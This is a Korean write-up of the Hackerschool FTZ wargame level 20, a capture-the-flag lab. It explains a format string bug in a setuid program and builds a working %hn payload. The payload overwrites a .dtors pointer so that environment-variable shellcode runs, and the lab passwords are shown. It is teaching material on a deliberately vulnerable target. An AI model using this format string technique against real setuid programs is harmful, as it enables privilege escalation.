---
sort: 20
---

# Level 20

```note
id : level20

password : we are just regular guys
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 공격해보자.

```c
#include <stdio.h>
main(int argc,char **argv)
{ char bleh[80];
  setreuid(3101,3101);
  fgets(bleh,79,stdin);
  printf(bleh);
}
```

사용자의 input을 그대로 printf에 입력한다. 여기에서 format string bug (FSB)가 발생한다.<br>
printf의 포맷중에서는 화면에 출력하는 것 뿐만아니라 메모리에 입력하는 포맷도 존재하기 때문에 이를 이용하여 임의의 공간에 임의의 값을 쓰는 것이 가능해진다.

## Format String Bug

printf에는 무려 지금까지 출력한 byte수를 저장할 수 있도록 %n(4byte값으로 저장), %hn(2byte), %hhn(1byte) 포맷이 존재한다.<br>
따라서 %n과 같은 서식문자가 저장할 공간의 메모리 주소를 미리 알아내어 준비한 뒤 원하는 값을 해당 메모리 주소에 넣기 위해서 원하는 값만큼 %n 이전에 출력하면 된다.<br><br>
저장할 공간의 메모리 주소를 미리 알아내어 다른 부분은 훼손하지 않고 해당 부분만 변형할 수 있기 때문에 bof보다 더 영향력이 크면 컸지 작진 않다.<br>
문제는 메모리 주소를 사전에 알아야 한다는 것인데, 해커스쿨 플랫폼 같은 경우에는 stack에 ASLR이 걸려있기 때문에 입력 buffer와의 간격을 계산하여 return address를 변조했던 bof와 달리, fsb로는 return address를 변조하기는 어려워 보인다. 따라서 저장위치가 바뀌지 않으면서도 프로그램의 흐름을 바꿀 수 있는 부분을 이용해야한다.

### Constructor, Destructor

C++에만 존재할 것 같았던 constructor와 destructor는 C에도 존재한다. 물론 object를 생성하고 소멸시키는데 사용되는 C++의 constructor, destructor와는 다르게 C에는 main함수가 호출되기 이전에 호출되는 constructor, main함수가 종료된 후에 호출되는 destructor가 존재한다. constructor와 destructor는 아래와 같이 만들 수 있다.

```C
#include <stdio.h>

/*
 * constructor : __attribute__((constructor (priority)))
 * destructor : __attribute__((destructor (priority)))
 *
 * priority값은 생략 가능.
 */

__attribute__((constructor (101))) void constructor_1(void)
{
        puts("constructor_1");
}

__attribute__((constructor (102))) void constructor_2(void)
{
        puts("constructor_2");
}

__attribute__((constructor (103))) void constructor_3(void)
{
        puts("constructor_3");
}

__attribute__((destructor (101))) void destructor_1(void)
{
        puts("destructor_1");
}

__attribute__((destructor (102))) void destructor_2(void)
{
        puts("destructor_2");
}

__attribute__((destructor (103))) void destructor_3(void)
{
        puts("destructor_3");
}

int main(int argc, char** argv)
{
        puts("main");
        return 0;
}
```

위와 같이 직접 constructor와 destructor를 정의할 수 있다.<br>
constructor는 priority값이 낮은 것 먼저, destructor는 priority값이 높은 것 먼저 실행된다.<br>
priority값은 0~100사이는 reserved되어있기 때문에 101부터 사용해야한다.

```bash
$ ./test
constructor_1
constructor_2
constructor_3
main
destructor_3
destructor_2
destructor_1
```

```note
hacker school에서 사용하는 gcc 버전은 3.2.2로 매우 옛날 것이기 때문에 constructor, destructor를 만들 때 priority를 줄 수 없다.

여러개의 constructor와 destructor를 만들었을 경우, **constructor**는 **LIFO**, **destructor**는 **FIFO**로 처리된다.

따라서 위 코드에서 priority값만 빼고 hacker school 플랫폼에서 다시 빌드하면 **constructor 3, 2, 1, main, destructor 3, 2, 1**순으로 실행된다.
```

```bash
[level20@ftz tmp]$ gcc -v
Reading specs from /usr/lib/gcc-lib/i386-redhat-linux/3.2.2/specs
Configured with: ../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --enable-shared --enable-threads=posix --disable-checking --with-system-zlib --enable-__cxa_atexit --host=i386-redhat-linux
Thread model: posix
gcc version 3.2.2 20030222 (Red Hat Linux 3.2.2-5)
```


왜 갑자기 constructor, destructor 얘기를 꺼내느냐, destructor는 main함수가 끝난 후에 실행이 되기 때문에 main함수에서 FSB를 이용하여 destructor함수를 가리키는 포인터 값을 조작하여 destructor 처리 루틴에서 프로그램의 흐름을 변조시킬 수 있기 때문이다.<br>
constructor, destructor함수들의 함수 포인터들은 .ctor, .dtor section에서 관리가 되며, 해당 section들의 위치는 `readelf`명령어를 통해 확인 가능하다.

<pre>
[level20@ftz tmp]$ readelf -S test
There are 34 section headers, starting at offset 0x1e04:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        080480f4 0000f4 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048108 000108 000020 00   A  0   0  4
  [ 3] .hash             HASH            08048128 000128 000028 04   A  4   0  4
  [ 4] .dynsym           DYNSYM          08048150 000150 000050 10   A  5   1  4
  [ 5] .dynstr           STRTAB          080481a0 0001a0 00004a 00   A  0   0  1
  [ 6] .gnu.version      VERSYM          080481ea 0001ea 00000a 02   A  4   0  2
  [ 7] .gnu.version_r    VERNEED         080481f4 0001f4 000020 00   A  5   1  4
  [ 8] .rel.dyn          REL             08048214 000214 000008 08   A  4   0  4
  [ 9] .rel.plt          REL             0804821c 00021c 000010 08   A  4   b  4
  [10] .init             PROGBITS        0804822c 00022c 000017 00  AX  0   0  4
  [11] .plt              PROGBITS        08048244 000244 000030 04  AX  0   0  4
  [12] .text             PROGBITS        08048274 000274 0001f0 00  AX  0   0  4
  [13] .fini             PROGBITS        08048464 000464 00001b 00  AX  0   0  4
  [14] .rodata           PROGBITS        08048480 000480 00005e 00   A  0   0  4
  [15] .eh_frame         PROGBITS        080484e0 0004e0 000004 00   A  0   0  4
  [16] .data             PROGBITS        080494e4 0004e4 00000c 00  WA  0   0  4
  [17] .dynamic          DYNAMIC         080494f0 0004f0 0000c8 08  WA  5   0  4
  <b>[18] .ctors            PROGBITS        080495b8 0005b8 000014 00  WA  0   0  4
  [19] .dtors            PROGBITS        080495cc 0005cc 000014 00  WA  0   0  4 </b>
  [20] .jcr              PROGBITS        080495e0 0005e0 000004 00  WA  0   0  4
  [21] .got              PROGBITS        080495e4 0005e4 000018 04  WA  0   0  4
  [22] .bss              NOBITS          080495fc 0005fc 000004 00  WA  0   0  4
  [23] .comment          PROGBITS        00000000 0005fc 000132 00      0   0  1
  [24] .debug_aranges    PROGBITS        00000000 000730 000078 00      0   0  8
  [25] .debug_pubnames   PROGBITS        00000000 0007a8 000025 00      0   0  1
  [26] .debug_info       PROGBITS        00000000 0007cd 000a84 00      0   0  1
  [27] .debug_abbrev     PROGBITS        00000000 001251 000138 00      0   0  1
  [28] .debug_line       PROGBITS        00000000 001389 00027c 00      0   0  1
  [29] .debug_frame      PROGBITS        00000000 001608 000014 00      0   0  4
  [30] .debug_str        PROGBITS        00000000 00161c 0006ba 01  MS  0   0  1
  [31] .shstrtab         STRTAB          00000000 001cd6 00012b 00      0   0  1
  [32] .symtab           SYMTAB          00000000 002354 000720 10     33  54  4
  [33] .strtab           STRTAB          00000000 002a74 000440 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</pre>

그리고 hexdump를 통해 hex값으로 test를 dump한 후, .ctors부분과 .dtors부분을 확인했다. 위에 readelf를 통해 알 수 있듯이 둘은 붙어있었다.

<pre>
[level20@ftz tmp]$ hexdump test

... (중략) ...

# 5b8부터 5cc전까지 .ctor, 5cc부터는 .dtor
00005b0 0000 0000 0000 0000 <b>ffff ffff 8324 0804
00005c0 833c 0804 8354 0804 0000 0000 ffff ffff
00005d0 836c 0804 8384 0804 839c 0804 0000 0000 </b>

... (후략) ...
</pre>

그리고 constructor와 destructor를 호출하는 루틴은 각각 `__do_global_ctors_aux`와 `__do_global_dtors_aux`이다.<br>
ctor, dtor부분에 watchpoint를 건 후에 프로그램을 동작시키면 어느 함수에서 ctor, dtor영역을 접근하는지 쉽게 파악할 수 있다.

```gdb
(gdb) disas __do_global_ctors_aux
Dump of assembler code for function __do_global_ctors_aux:
0x08048440 <__do_global_ctors_aux+0>:	push   %ebp
0x08048441 <__do_global_ctors_aux+1>:	mov    %esp,%ebp
0x08048443 <__do_global_ctors_aux+3>:	push   %ebx
0x08048444 <__do_global_ctors_aux+4>:	push   %edx
0x08048445 <__do_global_ctors_aux+5>:	mov    0x80495c4,%eax      <-- constructor 함수 중 마지막 함수의 포인터가 위치하는 곳
0x0804844a <__do_global_ctors_aux+10>:	cmp    $0xffffffff,%eax  <-- 값이 0xffffffff인지 확인
0x0804844d <__do_global_ctors_aux+13>:	mov    $0x80495c4,%ebx
0x08048452 <__do_global_ctors_aux+18>:	je     0x8048460 <__do_global_ctors_aux+32>
0x08048454 <__do_global_ctors_aux+20>:	sub    $0x4,%ebx         <-- constructor 함수 포인터 4 감소
0x08048457 <__do_global_ctors_aux+23>:	call   *%eax             <-- constructor 함수 호출
0x08048459 <__do_global_ctors_aux+25>:	mov    (%ebx),%eax
0x0804845b <__do_global_ctors_aux+27>:	cmp    $0xffffffff,%eax
0x0804845e <__do_global_ctors_aux+30>:	jne    0x8048454 <__do_global_ctors_aux+20>
0x08048460 <__do_global_ctors_aux+32>:	pop    %eax
0x08048461 <__do_global_ctors_aux+33>:	pop    %ebx
0x08048462 <__do_global_ctors_aux+34>:	leave  
0x08048463 <__do_global_ctors_aux+35>:	ret    
End of assembler dump.

(gdb) disas __do_global_dtors_aux
Dump of assembler code for function __do_global_dtors_aux:
0x080482bc <__do_global_dtors_aux+0>:	push   %ebp
0x080482bd <__do_global_dtors_aux+1>:	mov    %esp,%ebp
0x080482bf <__do_global_dtors_aux+3>:	sub    $0x8,%esp
0x080482c2 <__do_global_dtors_aux+6>:	cmpb   $0x0,0x80495fc
0x080482c9 <__do_global_dtors_aux+13>:	jne    0x80482f4 <__do_global_dtors_aux+56>
0x080482cb <__do_global_dtors_aux+15>:	mov    0x80494ec,%eax <-- 첫번째 destructor함수 포인터가 위치하는 곳의 주소값을 가지고 있음.
0x080482d0 <__do_global_dtors_aux+20>:	mov    (%eax),%edx
0x080482d2 <__do_global_dtors_aux+22>:	test   %edx,%edx      <-- 0인지 확인
0x080482d4 <__do_global_dtors_aux+24>:	je     0x80482ed <__do_global_dtors_aux+49>
0x080482d6 <__do_global_dtors_aux+26>:	mov    %esi,%esi
0x080482d8 <__do_global_dtors_aux+28>:	add    $0x4,%eax
0x080482db <__do_global_dtors_aux+31>:	mov    %eax,0x80494ec <-- 다음 destructor함수 포인터가 위치하는 곳으로 주소값 옮기고 저장.
0x080482e0 <__do_global_dtors_aux+36>:	call   *%edx          <-- destructor 함수 호출
0x080482e2 <__do_global_dtors_aux+38>:	mov    0x80494ec,%eax
0x080482e7 <__do_global_dtors_aux+43>:	mov    (%eax),%edx
0x080482e9 <__do_global_dtors_aux+45>:	test   %edx,%edx
0x080482eb <__do_global_dtors_aux+47>:	jne    0x80482d8 <__do_global_dtors_aux+28>
0x080482ed <__do_global_dtors_aux+49>:	movb   $0x1,0x80495fc
0x080482f4 <__do_global_dtors_aux+56>:	leave  
0x080482f5 <__do_global_dtors_aux+57>:	ret    
0x080482f6 <__do_global_dtors_aux+58>:	mov    %esi,%esi
End of assembler dump.
```

최종적으로 정리하면 아래 그림처럼 되겠다.

<img src="/picture/hacker_school/ftz/level20.png" width="1000"/>

참고로 .ctor .dtor사용하던 시절은 지났고 지금은(gcc 4.7 이후부터는) .ctors .dtors대신에 .init_array .fini_array를 사용한다고 한다.

### attackme

.dtors의 주소값이 0x8049594이다. hackerschool 플랫폼은 stack에만 ASLR이 걸려있기 때문에 나머지는 고정적인 주소값을 가지게 된다.<br>
따라서 0x8049598주소부터 4byte를 쉘코드의 주소로 변조하면 된다.<br>
쉘코드는 level17 때처럼 환경변수에 넣어놓고 사용했다.

<pre>
[level20@ftz level20]$ readelf -S attackme
There are 34 section headers, starting at offset 0x1dcc:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al

  ... (중략) ...

  [19] .dtors            PROGBITS        08049594 000594 000008 00  WA  0   0  4

  ... (중략) ...

Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</pre>

우선 아래와 같이 입력값이 어디에 위치하게 되는지 알아보았다.

```bash
[level20@ftz tmp]$ ../attackme
AAAABBBB %x %x %x %x %x
AAAABBBB 4f 4212ecc0 4207a750 41414141 42424242
```

세번째 %x부터 입력값이 나오는 것을 확인할 수 있었다. 따라서 아래와 같이 구성한다면 .dtors section에 shellcode의 주소값을 넣을 수 있다.

```
target address 상위 2byte      4byte padding       target address 하위 2byte
\x9a\x95\x04\x08               AAAA                \x98\x95\x04\x08

0xbfff값을 입력하기 위해 0xbfffbyte(12+8+8+49123) 출력        target address 상위 2byte에 입력
%8x%8x%49123x                                                 %hn

0xff03값을 입력하기 위해 마저 16132byte 출력(0xbfff+16132=0xff03)       target address 하위 2byte에 입력
%16132x                                                                 %hn
```

쉘코드의 주소값인 0xbfffff03이 4byte로 하면 음수가 되기 때문에 혹시 몰라서 2byte씩 나누어서 입력했다.


```bash
[level20@ftz tmp]$ ./shellcode
0xbfffff03
[level20@ftz tmp]$ (python -c "print('\x9a\x95\x04\x08AAAA\x98\x95\x04\x08%8x%8x%49123x%hn%16132x%hn')";cat) | ../attackme

... (쓰레기 출력값) ...

my-pass

TERM environment variable not set.

clear Password is "i will come in a minute".
웹에서 등록하세요.

* 해커스쿨의 든 레벨을 통과하신 것을 축하드립니다.
당신의 끈질긴 열정과 능숙한 솜씨에 찬사를 보냅니다.
해커스쿨에서는 실력있 분들을 모아 연구소라는 그룹을 운영하고 있습니다.
이 메시지를 보시는 분들 중에 연구소에 관심있으신 분은 자유로운 양식의
가입 신청서를 admin@hackerschool.org로 보내주시기 바랍니다.
```

```tip
## 알게 된 점

constructor, destructor

Format String Bug (FSB)
```